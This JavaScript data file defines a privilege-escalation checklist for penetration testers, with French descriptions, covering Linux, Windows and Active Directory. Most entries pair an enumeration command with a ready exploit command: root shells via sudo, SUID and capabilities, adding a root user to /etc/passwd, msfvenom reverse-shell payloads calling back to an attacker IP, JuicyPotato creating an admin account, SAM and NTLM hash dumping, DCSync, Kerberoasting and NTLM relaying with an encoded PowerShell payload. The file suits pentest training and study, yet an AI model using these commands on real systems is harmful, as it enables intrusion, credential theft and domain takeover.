// ==========================================================================
// ==================== CHECKLIST DEFINITION ================================
// ==========================================================================
// Structure:
// CHECKLIST_DEFINITION[OS_TYPE][CATEGORY] = [ { item }, { item }, ... ]
// Item: { id, label, description, checkCommand, exploitCommand?, tips?, links?, tags? }
// ==========================================================================

const CHECKLIST_DEFINITION = {
    // ==========================================================
    // ==================== LINUX ===============================
    // ==========================================================
    'Linux': {
        'Kernel Exploits': [
            {
                id: 'l_kernel_version',
                label: 'Kernel Version & Vulnerabilities',
                description: 'Vérifier la version du kernel et rechercher des exploits de privilèges locaux connus.',
                checkCommand: 'uname -a\ncat /proc/version\nsearchsploit "Linux Kernel $(uname -r | cut -d\'-\' -f1)" local privilege escalation',
                exploitCommand: '# (Requires specific exploit based on searchsploit results)\n# Exemple: gcc exploit.c -o exploit && ./exploit',
                tips: 'Les exploits de kernel sont puissants mais risqués. Testez-les avec précaution. Vérifiez la compatibilité exacte de l\'exploit avec la version du kernel et l\'architecture.',
                links: ['https://www.exploit-db.com/'],
                tags: ['kernel', 'exploit', 'vulnerability', 'searchsploit']
            }
        ],
        'Permissions & Misconfigurations': [
            {
                id: 'l_sudo_l',
                label: 'Sudo Permissions (sudo -l)',
                description: 'Vérifier les commandes que l\'utilisateur peut exécuter avec sudo, en particulier celles sans mot de passe ou permettant l\'exécution en tant que root.',
                checkCommand: 'sudo -l',
                exploitCommand: '# Si /bin/bash est autorisé:\nsudo /bin/bash\n# Si un éditeur est autorisé (ex: vim):\nsudo vim /etc/shadow (puis :!/bin/bash)\n# Si find est autorisé:\nsudo find . -exec /bin/bash \\; -quit',
                tips: 'GTFOBins est une ressource essentielle pour trouver comment abuser des binaires autorisés par sudo.',
                links: ['https://gtfobins.github.io/#+sudo'],
                tags: ['sudo', 'permissions', 'misconfiguration', 'gtfobins']
            },
            {
                id: 'l_suid_sgid',
                label: 'SUID/SGID Binaries',
                description: 'Rechercher les binaires avec les bits SUID ou SGID activés qui pourraient être exploités pour exécuter du code avec les privilèges du propriétaire (souvent root).',
                checkCommand: 'find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null',
                exploitCommand: '# Si /usr/bin/find est SUID:\nfind . -exec /bin/bash -p \\; -quit\n# Si /usr/bin/cp est SUID:\ncp /etc/shadow /tmp/shadow_copy && chmod 600 /tmp/shadow_copy\n# Si /usr/bin/base64 est SUID:\nLFILE=/etc/shadow; base64 "$LFILE" | base64 --decode',
                tips: 'Concentrez-vous sur les binaires non standards ou ceux connus pour être exploitables (voir GTFOBins).',
                links: ['https://gtfobins.github.io/#+suid', 'https://gtfobins.github.io/#+sgid'],
                tags: ['suid', 'sgid', 'permissions', 'binary', 'gtfobins']
            },
            {
                id: 'l_capabilities',
                label: 'Linux Capabilities',
                description: 'Identifier les binaires avec des capabilities étendues qui pourraient permettre une escalade de privilèges.',
                checkCommand: 'getcap -r / 2>/dev/null',
                exploitCommand: '# Si python a cap_setuid+ep:\n./python -c \'import os; os.setuid(0); os.system("/bin/bash -p")\'\n# Si tar a cap_dac_read_search+ep:\ntar -cf shadow.tar /etc/shadow',
                tips: 'Les capabilities comme `cap_setuid`, `cap_sys_admin`, `cap_dac_read_search` sont particulièrement intéressantes.',
                links: ['https://gtfobins.github.io/#+capabilities', 'https://linux-audit.com/linux-capabilities-hardening-linux-binaries/'],
                tags: ['capabilities', 'permissions', 'binary', 'gtfobins']
            },
            {
                id: 'l_writable_files',
                label: 'World-Writable Files/Directories',
                description: 'Rechercher les fichiers et répertoires importants (scripts, configurations) qui sont modifiables par tous les utilisateurs.',
                checkCommand: 'find / -type f -perm -0002 -ls 2>/dev/null\nfind / -type d -perm -0002 -ls 2>/dev/null',
                exploitCommand: '# Si /etc/passwd est world-writable:\necho \'root2:$1$xyz$abcdefghijklmnopq.:0:0:root:/root:/bin/bash\' >> /etc/passwd\n# Si un script exécuté par root est world-writable:\necho \'chmod +s /bin/bash\' >> /path/to/script.sh',
                tips: 'Faites attention aux fichiers de configuration, aux scripts dans `/etc/cron.*`, `/etc/init.d`, etc.',
                tags: ['permissions', 'writable', 'misconfiguration', 'files']
            },
             {
                id: 'l_path_hijacking',
                label: 'PATH Environment Variable Hijacking',
                description: 'Vérifier si le PATH contient des répertoires modifiables (comme `.`) avant les répertoires système, permettant d\'exécuter un binaire malveillant à la place d\'un binaire légitime.',
                checkCommand: 'echo $PATH\n# Vérifier les permissions des dossiers dans $PATH',
                exploitCommand: '# Si /tmp est dans le PATH avant /usr/bin et qu\'un script root exécute `ls`:\ncd /tmp\necho \'#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > ls\nchmod +x ls\n# Attendre que le script root exécute `ls`',
                tips: 'Particulièrement pertinent si un script exécuté par root utilise des chemins relatifs pour les commandes.',
                tags: ['path', 'environment', 'hijacking', 'permissions']
            },
            {
                id: 'l_acl',
                label: 'Abusing File System Permissions (ACLs)',
                description: 'Vérifier les Access Control Lists (ACLs) des fichiers et répertoires pour des permissions inattendues.',
                checkCommand: 'find / -type f -acl -exec getfacl {} \\; 2>/dev/null\nfind / -type d -acl -exec getfacl {} \\; 2>/dev/null',
                exploitCommand: '# Si getfacl montre u:<user>:rwx sur un fichier privilégié:\nsetfacl -m u:$USER:rwx /chemin/fichier_privilegie; echo \'evil_command\' > /chemin/fichier_privilegie',
                tips: 'Les ACLs peuvent outrepasser les permissions Unix standard. Recherchez les entrées `user:<your_user>:rwx` ou `group:<your_group>:rwx`.',
                tags: ['acl', 'permissions', 'filesystem']
            },
            {
                id: 'l_pam',
                label: 'Exploiting PAM (Pluggable Authentication Modules)',
                description: 'Vérifier les configurations PAM pour des faiblesses potentielles (rare mais possible).',
                checkCommand: 'ls -l /etc/pam.d/\ncat /etc/pam.d/*',
                exploitCommand: '# Très contextuel, dépend d\'une mauvaise configuration spécifique.',
                tips: 'Recherchez des modules mal configurés ou des fichiers modifiables dans `/etc/pam.d/`.',
                tags: ['pam', 'authentication', 'misconfiguration']
            }
        ],
        'Services & Cron Jobs': [
            {
                id: 'l_cron_jobs',
                label: 'Cron Jobs Analysis',
                description: 'Analyser les tâches cron système et utilisateur pour identifier des scripts ou binaires modifiables exécutés avec des privilèges élevés.',
                checkCommand: 'ls -l /etc/cron*\ncat /etc/crontab\ncat /etc/cron.d/*\ncrontab -l',
                exploitCommand: '# Si un script dans /etc/cron.hourly est modifiable:\necho \'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' >> /etc/cron.hourly/modifiable_script.sh',
                tips: 'Vérifiez les permissions des scripts et des répertoires où ils se trouvent. Attention aux wildcards dans les commandes cron.',
                tags: ['cron', 'scheduled task', 'permissions', 'script']
            },
            {
                id: 'l_systemctl_abuse',
                label: 'Abusing Systemctl (via Sudo)',
                description: 'Si l\'utilisateur a des droits sudo spécifiques sur `systemctl`, cela peut être utilisé pour démarrer/modifier des services et escalader.',
                checkCommand: 'sudo -l | grep systemctl',
                exploitCommand: '# Créer un service malveillant (evil.service):\n[Unit]\nDescription=Evil Service\n\n[Service]\nType=simple\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"\n\n[Install]\nWantedBy=multi-user.target\n\n# Placer le service et démarrer:\nsudo cp evil.service /etc/systemd/system/\nsudo systemctl enable evil.service --now',
                tips: 'Vérifiez si `sudo systemctl start/stop/enable/disable/edit` est autorisé.',
                tags: ['systemd', 'systemctl', 'service', 'sudo', 'misconfiguration']
            }
        ],
        'Credentials & Information': [
            {
                id: 'l_history_files',
                label: 'Shell History Files',
                description: 'Vérifier les fichiers d\'historique du shell pour des mots de passe, clés API ou informations sensibles.',
                checkCommand: 'cat ~/.bash_history\ncat ~/.zsh_history\ncat ~/.ash_history\ncat /root/.bash_history (si lisible)',
                tips: 'Recherchez des commandes contenant `-p`, `password`, `pass`, `secret`, `key`, `token`, `ssh`, `mysql`, `psql`, etc.',
                tags: ['credentials', 'history', 'sensitive data', 'enumeration']
            },
            {
                id: 'l_config_files',
                label: 'Configuration Files',
                description: 'Rechercher des mots de passe en clair ou des informations sensibles dans les fichiers de configuration courants.',
                checkCommand: 'grep -iE \'(password|passwd|pass|secret|key)=\' /etc/* /var/www/* ~/.* /opt/* -R 2>/dev/null\nfind / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.yml" -exec grep -iE \'(password|secret|key)\' {} \\; -print 2>/dev/null',
                tips: 'Fichiers courants: `/etc/shadow` (hash), `/etc/fstab`, web server configs (Apache, Nginx), database configs, application configs.',
                tags: ['credentials', 'config file', 'sensitive data', 'enumeration']
            },
            {
                id: 'l_ssh_keys',
                label: 'SSH Keys',
                description: 'Rechercher des clés SSH privées (souvent `id_rsa`) qui pourraient permettre de se connecter à d\'autres machines ou en tant qu\'autres utilisateurs.',
                checkCommand: 'ls -l ~/.ssh/\nfind / -name id_rsa 2>/dev/null',
                exploitCommand: '# Si une clé privée est trouvée pour root:\nchmod 600 /path/to/root_id_rsa\nssh -i /path/to/root_id_rsa root@localhost',
                tips: 'Vérifiez les permissions des clés. Les clés privées doivent être protégées (600).',
                tags: ['credentials', 'ssh', 'key', 'enumeration']
            }
        ],
        'Software Vulnerabilities': [
            {
                id: 'l_software_vulns',
                label: 'Exploiting Software Vulnerabilities (Local)',
                description: 'Rechercher les vulnérabilités dans les logiciels installés (autres que le kernel) qui ont des exploits locaux connus.',
                checkCommand: 'dpkg -l\nrpm -qa\n# Utiliser des outils comme LinPEAS ou linux-exploit-suggester',
                exploitCommand: '# Utiliser searchsploit ou des bases de données de vulnérabilités:\nsearchsploit <nom_du_logiciel> <version> local privilege escalation',
                tips: 'Nécessite une identification précise de la version du logiciel vulnérable.',
                tags: ['software', 'vulnerability', 'exploit', 'searchsploit']
            }
        ],
        'NFS Misconfigurations': [
            {
                id: 'l_nfs_no_root_squash',
                label: 'NFS Root Squashing Disabled',
                description: 'Si un partage NFS est monté avec l\'option `no_root_squash`, l\'utilisateur root local peut créer des fichiers SUID appartenant à root sur le partage.',
                checkCommand: 'cat /etc/exports (sur le serveur NFS)\nshowmount -e <NFS_SERVER_IP>\nmount | grep nfs\ncat /etc/fstab | grep nfs',
                exploitCommand: '# Sur la machine cliente (en tant que root local):\nmount -t nfs <NFS_SERVER_IP>:/path/to/share /mnt/nfs\ncp /bin/bash /mnt/nfs/rootshell\nchmod +s /mnt/nfs/rootshell\n# Sur une autre machine ayant accès au partage (ou la même):\n/mnt/nfs/rootshell -p',
                tips: 'Nécessite d\'avoir un accès root local sur une machine qui monte le partage NFS vulnérable.',
                tags: ['nfs', 'permissions', 'misconfiguration', 'suid', 'network']
            }
        ]
    },

    // ==========================================================
    // ==================== WINDOWS =============================
    // ==========================================================
    'Windows': {
        'Misconfigurations': [
            {
                id: 'w_always_install_elevated',
                label: 'AlwaysInstallElevated Registry Keys',
                description: 'Vérifier si les clés de registre `AlwaysInstallElevated` sont activées, permettant à n\'importe quel utilisateur d\'installer des packages MSI avec les privilèges SYSTEM.',
                checkCommand: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                exploitCommand: '# Générer un payload MSI malveillant:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f msi -o evil.msi\n# Transférer evil.msi sur la cible\n# Exécuter l\'installeur MSI:\nmsiexec /i evil.msi /quiet',
                tips: 'Les deux clés (HKLM et HKCU) doivent être à 1 pour que cela fonctionne.',
                tags: ['registry', 'msi', 'misconfiguration', 'system']
            },
            {
                id: 'w_unquoted_service_paths',
                label: 'Unquoted Service Paths',
                description: 'Identifier les services Windows dont le chemin vers l\'exécutable n\'est pas entre guillemets et contient des espaces.',
                checkCommand: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\npowershell -c "Get-CimInstance -ClassName Win32_Service | Select Name, DisplayName, PathName, StartMode | Where-Object {$_.StartMode -eq \'Auto\' -and $_.PathName -notlike \'C:\\Windows\\*\' -and $_.PathName -notlike \'"*\'}"',
                exploitCommand: '# Si le chemin est "C:\\Program Files\\Some Dir\\service.exe":\n# Placer un exécutable malveillant nommé "Program.exe" dans C:\\\nmsfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe -o "C:\\Program.exe"\n# Redémarrer le service (ou attendre le redémarrage du système):\nsc stop <ServiceName> && sc start <ServiceName>',
                tips: 'Nécessite des permissions d\'écriture dans un des dossiers parents du chemin (ex: `C:\\`).',
                tags: ['service', 'permissions', 'misconfiguration', 'path']
            },
            {
                id: 'w_weak_service_permissions',
                label: 'Insecure Service Permissions',
                description: 'Vérifier si l\'utilisateur actuel a des permissions pour modifier la configuration (chemin du binaire, utilisateur d\'exécution) ou redémarrer des services qui tournent avec des privilèges élevés.',
                checkCommand: '# Utiliser PowerUp.ps1:\nImport-Module .\\PowerUp.ps1; Get-ModifiableService\n# Ou AccessChk.exe (Sysinternals):\naccesschk.exe /accepteula -uwcqv <USERNAME> *',
                exploitCommand: '# Si le service "VulnSvc" est modifiable:\nsc config VulnSvc binPath= "C:\\path\\to\\evil.exe"\nsc stop VulnSvc\nsc start VulnSvc',
                tips: 'Les permissions intéressantes sont `SERVICE_CHANGE_CONFIG`, `SERVICE_START`, `SERVICE_STOP`, `WRITE_DAC`, `WRITE_OWNER`.',
                links: ['https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1'],
                tags: ['service', 'permissions', 'acl', 'misconfiguration', 'powerup']
            },
            {
                id: 'w_weak_registry_permissions',
                label: 'Insecure Registry Permissions',
                description: 'Vérifier si l\'utilisateur a des permissions d\'écriture sur des clés de registre sensibles, notamment celles liées aux services ou à l\'autostart.',
                checkCommand: '# Utiliser PowerUp.ps1:\nImport-Module .\\PowerUp.ps1; Get-ModifiableRegistryAutoRun\n# Ou AccessChk.exe:\naccesschk.exe /accepteula -uwk "HKLM\\Software"\naccesschk.exe /accepteula -uwk "HKLM\\System\\CurrentControlSet\\Services"',
                exploitCommand: '# Si HKLM\\...\\Service\\ImagePath est modifiable:\nreg add "HKLM\\...\\Service" /v ImagePath /t REG_EXPAND_SZ /d "C:\\path\\to\\evil.exe" /f\n# Redémarrer le service',
                tips: 'Rechercher les permissions `KEY_WRITE`, `KEY_CREATE_SUB_KEY`.',
                tags: ['registry', 'permissions', 'acl', 'misconfiguration', 'powerup']
            },
            {
                id: 'w_weak_folder_permissions',
                label: 'Insecure Folder Permissions (DLL Hijacking)',
                description: 'Identifier les dossiers dans le PATH système ou dans les chemins d\'exécutables de services où l\'utilisateur a des droits d\'écriture, permettant potentiellement le DLL Hijacking.',
                checkCommand: '# Utiliser PowerUp.ps1:\nImport-Module .\\PowerUp.ps1; Find-PathDLLHijack\n# Ou AccessChk.exe sur les dossiers du PATH et des services',
                exploitCommand: '# Générer une DLL malveillante (ex: hijack.dll)\n# Placer hijack.dll dans le dossier vulnérable\n# Redémarrer le service/application qui charge la DLL',
                tips: 'Nécessite de connaître le nom d\'une DLL chargée par un processus privilégié et manquante ou chargée depuis un chemin non sécurisé.',
                tags: ['permissions', 'dll hijacking', 'path', 'misconfiguration', 'powerup']
            }
        ],
        'Credentials & Tokens': [
            {
                id: 'w_saved_credentials',
                label: 'Windows Vault / Credential Manager',
                description: 'Rechercher des identifiants sauvegardés dans le gestionnaire d\'identification Windows.',
                checkCommand: 'cmdkey /list\npowershell -c "(Get-Vault).Credential | Format-List -Property *"',
                exploitCommand: '# Utiliser Mimikatz (nécessite des privilèges élevés ou un contexte spécifique):\nmimikatz # vault::cred',
                tips: 'Peut contenir des identifiants pour des partages réseau, RDP, sites web.',
                tags: ['credentials', 'vault', 'cmdkey', 'mimikatz']
            },
            {
                id: 'w_unattended_install_files',
                label: 'Unattended Install Files',
                description: 'Rechercher des fichiers d\'installation sans surveillance (Unattend.xml, sysprep.inf, etc.) qui peuvent contenir des mots de passe administrateur en clair ou encodés.',
                checkCommand: 'dir /s /b C:\\*Unattend*.xml\ndir /s /b C:\\*sysprep*.inf\ndir /s /b C:\\*sysprep*.xml\ntype C:\\Windows\\Panther\\Unattend\\Unattend.xml',
                tips: 'Les mots de passe sont souvent encodés en Base64 dans ces fichiers.',
                tags: ['credentials', 'unattended', 'sysprep', 'xml', 'sensitive data']
            },
            {
                id: 'w_sam_system_backup',
                label: 'SAM/SYSTEM Hive Backup',
                description: 'Vérifier si les fichiers SAM et SYSTEM (contenant les hashs NTLM locaux) sont accessibles ou si des sauvegardes existent.',
                checkCommand: 'dir C:\\Windows\\Repair\\\ndir C:\\Windows\\System32\\config\\RegBack\\',
                exploitCommand: '# Si accessibles:\ncopy C:\\Windows\\System32\\config\\SAM .\ncopy C:\\Windows\\System32\\config\\SYSTEM .\n# Extraire les hashs hors ligne:\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL',
                tips: 'Nécessite souvent des privilèges élevés pour accéder aux fichiers actifs. Les sauvegardes (RegBack) peuvent être accessibles.',
                tags: ['credentials', 'hash', 'ntlm', 'sam', 'system', 'secretsdump']
            },
            {
                id: 'w_token_impersonation',
                label: 'Token Impersonation (SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege)',
                description: 'Vérifier si l\'utilisateur possède les privilèges `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.',
                checkCommand: 'whoami /priv',
                exploitCommand: '# Utiliser Juicy Potato / Rotten Potato / PrintSpoofer / GodPotato etc.:\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user hacker password /add && net localgroup administrators hacker /add" -t * -c {CLSID}\n.\\PrintSpoofer.exe -i -c cmd',
                tips: 'Permet d\'usurper le token de sécurité d\'autres processus, souvent `NT AUTHORITY\\SYSTEM`. Nécessite des conditions spécifiques (ex: service réseau écoutant).',
                links: ['https://github.com/ohpe/juicy-potato', 'https://github.com/itm4n/PrintSpoofer'],
                tags: ['token', 'impersonation', 'privilege', 'SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege', 'juicypotato', 'printspoofer']
            },
            {
                id: 'w_backup_operators',
                label: 'Backup Operators Privilege (SeBackupPrivilege)',
                description: 'Vérifier si l\'utilisateur est membre du groupe `Backup Operators` ou possède le privilège `SeBackupPrivilege`.',
                checkCommand: 'whoami /priv\nwhoami /groups\nnet user <username>\nnet localgroup "Backup Operators"',
                exploitCommand: '# Permet de lire n\'importe quel fichier, y compris SAM/SYSTEM:\n# Utiliser robocopy avec l\'option /B:\nrobocopy C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM /B\n# Ou des outils spécifiques comme diskshadow:\ndiskshadow /s script.txt (script.txt contient les commandes pour monter et copier)',
                tips: 'Ce privilège permet de contourner les ACLs pour la lecture de fichiers.',
                tags: ['privilege', 'SeBackupPrivilege', 'backup operators', 'acl', 'sam', 'system']
            }
        ],
        'Services & Tasks': [
            {
                id: 'w_scheduled_tasks',
                label: 'Scheduled Tasks',
                description: 'Analyser les tâches planifiées pour identifier celles qui s\'exécutent avec des privilèges élevés et dont le binaire ou le script associé est modifiable.',
                checkCommand: 'schtasks /query /fo LIST /v\npowershell -c "Get-ScheduledTask | Where-Object {$_.Principal.UserID -ne $env:USERNAME} | Select TaskName, TaskPath, State, Principal | Format-List"',
                exploitCommand: '# Si le binaire d\'une tâche SYSTEM est modifiable:\n# Remplacer le binaire par un payload\n# Attendre l\'exécution de la tâche ou la déclencher:\nschtasks /run /tn "<TaskName>"',
                tips: 'Vérifiez les permissions sur les exécutables pointés par les tâches planifiées.',
                tags: ['scheduled task', 'schtasks', 'permissions', 'misconfiguration']
            }
        ],
        'Software Vulnerabilities': [
             {
                id: 'w_software_vulns',
                label: 'Exploiting Software Vulnerabilities (Local)',
                description: 'Rechercher les vulnérabilités dans les logiciels tiers installés qui ont des exploits locaux connus.',
                checkCommand: 'wmic product get name, version\npowershell -c "Get-WmiObject -Class Win32_Product | Select Name, Version"\n# Utiliser des outils comme Seatbelt, WinPEAS',
                exploitCommand: '# Utiliser searchsploit ou des bases de données de vulnérabilités:\nsearchsploit <nom_du_logiciel> <version> local privilege escalation',
                tips: 'Moins fréquent que les misconfigurations, mais toujours possible.',
                tags: ['software', 'vulnerability', 'exploit', 'searchsploit']
            }
        ]
    },

    // ==========================================================
    // ================= ACTIVE DIRECTORY =======================
    // ==========================================================
    'Active Directory': {
        'Kerberos Attacks': [
            {
                id: 'ad_kerberoasting',
                label: 'Kerberoasting',
                description: 'Identifier les comptes utilisateurs de domaine configurés avec un Service Principal Name (SPN) et demander un ticket de service Kerberos (TGS) pour eux. Le hash du TGS peut être cracké hors ligne.',
                checkCommand: '# PowerView:\nGetUserSPNs.ps1\n# Rubeus:\nRubeus.exe kerberoast /outfile:hashes.txt\n# Impacket:\nGetUserSPNs.py <DOMAIN>/<USER> -request -outputfile hashes.txt',
                exploitCommand: '# Cracker les hashs (Mode 13100 pour Kerberos 5 TGS-REP etype 23):\nhashcat -m 13100 hashes.txt wordlist.txt\njohn --format=krb5tgs hashes.txt --wordlist=wordlist.txt',
                tips: 'Cible les comptes de service. Les mots de passe faibles peuvent être rapidement découverts. Ne nécessite pas de privilèges élevés pour l\'énumération.',
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting'],
                tags: ['ad', 'kerberos', 'kerberoasting', 'credentials', 'spn', 'hashcat', 'john', 'rubeus', 'impacket']
            },
            {
                id: 'ad_asreproasting',
                label: 'AS-REP Roasting',
                description: 'Identifier les comptes utilisateurs pour lesquels l\'attribut "Do not require Kerberos preauthentication" est activé. Leur hash (AS-REP) peut être obtenu sans mot de passe et cracké hors ligne.',
                checkCommand: '# PowerView:\nGet-DomainUser -PreauthNotRequired -Verbose\n# Rubeus:\nRubeus.exe asreproast /domain:<DOMAIN> /format:hashcat /outfile:hashes.txt\n# Impacket:\nGetNPUsers.py <DOMAIN>/ -usersfile <users.txt> -format hashcat -outputfile hashes.txt -no-pass',
                exploitCommand: '# Cracker les hashs (Mode 18200 pour Kerberos 5 AS-REP etype 23):\nhashcat -m 18200 hashes.txt wordlist.txt\njohn --format=krb5asrep hashes.txt --wordlist=wordlist.txt',
                tips: 'Cible les comptes utilisateurs (pas les comptes de service). Moins courant que Kerberoasting.',
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting'],
                tags: ['ad', 'kerberos', 'asreproasting', 'credentials', 'preauthentication', 'hashcat', 'john', 'rubeus', 'impacket']
            }
        ],
        'ACL & Permissions Abuse': [
            {
                id: 'ad_acl_abuse',
                label: 'ACL Abuse (Generic)',
                description: 'Analyser les Access Control Lists (ACLs) sur les objets AD (utilisateurs, groupes, GPOs, objets ordinateur) pour trouver des permissions dangereuses (GenericAll, GenericWrite, WriteDacl, WriteOwner, etc.) accordées à des utilisateurs/groupes contrôlés.',
                checkCommand: '# BloodHound est l\'outil principal pour visualiser et requêter les ACLs.\n# PowerView:\nGet-ObjectAcl -SamAccountName <TargetUser> -ResolveGUIDs\nFind-InterestingDomainAcl -ResolveGUIDs\n# ACLScanner.ps1',
                exploitCommand: '# Si GenericWrite sur un utilisateur:\nSet-DomainUserPassword <TargetUser> -Password <NewPassword>\n# Si WriteDacl sur un groupe:\nAdd-DomainGroupMember -Identity <TargetGroup> -Members <ControlledUser>\n# Si GenericAll sur un GPO:\n# Modifier le GPO pour exécuter un script malveillant',
                tips: 'BloodHound simplifie grandement cette analyse complexe. Recherchez les chemins d\'attaque qu\'il identifie.',
                links: ['https://bloodhound.readthedocs.io/', 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse'],
                tags: ['ad', 'acl', 'permissions', 'bloodhound', 'powerview', 'genericall', 'genericwrite', 'writedacl']
            },
            {
                id: 'ad_gpo_abuse',
                label: 'Group Policy Abuse (GPO)',
                description: 'Identifier les GPOs modifiables par l\'utilisateur actuel qui s\'appliquent à des ordinateurs ou utilisateurs privilégiés. Permet d\'exécuter du code via les scripts de démarrage/logon, les tâches planifiées, etc.',
                checkCommand: '# BloodHound: Chercher les GPOs modifiables.\n# PowerView:\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\nFind-ModifiableGPOs',
                exploitCommand: '# Utiliser les outils RSAT ou des scripts PowerShell pour modifier le GPO:\n# Ajouter un script de démarrage immédiat ou une tâche planifiée.',
                tips: 'Nécessite souvent les outils RSAT ou des cmdlets AD spécifiques pour modifier les GPOs.',
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/gpo-abuse'],
                tags: ['ad', 'gpo', 'permissions', 'acl', 'scripts', 'bloodhound', 'powerview']
            },
            {
                id: 'ad_dcsync',
                label: 'DCSync Abuse',
                description: 'Vérifier si l\'utilisateur actuel (ou un groupe auquel il appartient) a les privilèges `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All` sur le domaine, permettant d\'extraire tous les hashs NTLM du contrôleur de domaine.',
                checkCommand: '# BloodHound: Chercher les utilisateurs avec droit DCSync.\n# PowerView:\nGet-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.ObjectType -match "replication"}\n# Ou tester directement:\nimpacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user <UserToDump>',
                exploitCommand: '# Mimikatz:\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /all /csv\n# Impacket:\nimpacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc',
                tips: 'Privilège extrêmement puissant, généralement réservé aux Domain Admins ou aux comptes de service spécifiques.',
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync'],
                tags: ['ad', 'dcsync', 'replication', 'credentials', 'hash', 'ntlm', 'mimikatz', 'impacket', 'bloodhound']
            }
        ],
        'Credential Relaying & Poisoning': [
            {
                id: 'ad_llmnr_nbtns_poisoning',
                label: 'LLMNR/NBT-NS Poisoning & SMB Relay',
                description: 'Écouter les requêtes LLMNR/NBT-NS sur le réseau, y répondre avec l\'IP de l\'attaquant, et relayer les authentifications NTLMv1/v2 reçues vers d\'autres machines (souvent pour exécuter du code via SMB).',
                checkCommand: '# Vérifier si LLMNR/NBT-NS sont actifs sur le réseau (souvent le cas par défaut).',
                exploitCommand: '# Outil: Responder + Ntlmrelayx\n# 1. Lancer Responder:\nresponder -I <interface> -wv\n# 2. Lancer Ntlmrelayx (pour relayer vers SMB et exécuter une commande):\nntlmrelayx.py -t smb://<TARGET_IP> -c "powershell -e <base64_payload>"',
                tips: 'Fonctionne mieux si la signature SMB n\'est pas requise sur la cible. Peut capturer des hashs NetNTLMv2 si le relais échoue.',
                links: ['https://book.hacktricks.xyz/windows-hardening/llmnr-nbt-ns-and-mdns-poisoning', 'https://book.hacktricks.xyz/windows-hardening/ntlm/ntlm-relay'],
                tags: ['ad', 'llmnr', 'nbt-ns', 'poisoning', 'smb relay', 'ntlm relay', 'responder', 'ntlmrelayx', 'network']
            },
            {
                id: 'ad_mitm6',
                label: 'mitm6 (IPv6 Attack)',
                description: 'Forcer les machines Windows à utiliser IPv6 et à s\'authentifier auprès du serveur DNS IPv6 de l\'attaquant, permettant de relayer ces authentifications.',
                checkCommand: '# Vérifier si IPv6 est activé sur le réseau.',
                exploitCommand: '# Outils: mitm6 + ntlmrelayx\n# 1. Lancer mitm6:\nmitm6 -d <DOMAIN>\n# 2. Lancer ntlmrelayx pour relayer vers LDAP(S) ou HTTP(S):\nntlmrelayx.py -6 -t ldaps://<DC_IP> -wh <WpadHostName> -l .',
                tips: 'Permet souvent de relayer vers LDAP pour ajouter un ordinateur au domaine ou modifier des objets.',
                links: ['https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/'],
                tags: ['ad', 'ipv6', 'mitm6', 'ntlm relay', 'ldap relay', 'network']
            }
        ],
        'Other Domain Techniques': [
             {
                id: 'ad_password_reuse',
                label: 'Password Reuse (Local -> Domain)',
                description: 'Tester les mots de passe locaux compromis (ex: via Mimikatz sur une machine jointe) contre des comptes de domaine.',
                checkCommand: '# Nécessite des identifiants locaux compromis.',
                exploitCommand: '# Utiliser CrackMapExec, Metasploit, etc. pour tester les identifiants:\ncrackmapexec smb <TARGET_SUBNET> -u <USER> -p <PASSWORD>\n# Ou via PowerShell:\n$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\\<USER>", (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force))\nInvoke-Command -ComputerName <TARGET_COMPUTER> -ScriptBlock { whoami } -Credential $cred',
                tips: 'Très courant. Les utilisateurs réutilisent souvent leurs mots de passe.',
                tags: ['ad', 'credentials', 'password reuse', 'crackmapexec']
            },
            {
                id: 'ad_service_principal_abuse',
                label: 'Service Principal Name (SPN) Scanning',
                description: 'Scanner le domaine pour les SPNs enregistrés afin d\'identifier les services potentiels (SQL, HTTP, etc.) et les comptes associés, utiles pour Kerberoasting ou ciblage.',
                checkCommand: '# PowerView:\nGet-NetUser -SPN | Select SamAccountName, ServicePrincipalName\nGet-NetComputer -SPN | Select DNSHostName, ServicePrincipalName\n# ldapsearch (Linux):\nldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" -b "DC=domain,DC=local" "servicePrincipalName=*" servicePrincipalName | grep servicePrincipalName',
                tips: 'Aide à cartographier les services critiques du domaine.',
                tags: ['ad', 'spn', 'kerberos', 'enumeration', 'powerview', 'ldapsearch']
            }
        ]
    }
};

// ==========================================================================
// ==================== END CHECKLIST DEFINITION ============================
// ==========================================================================


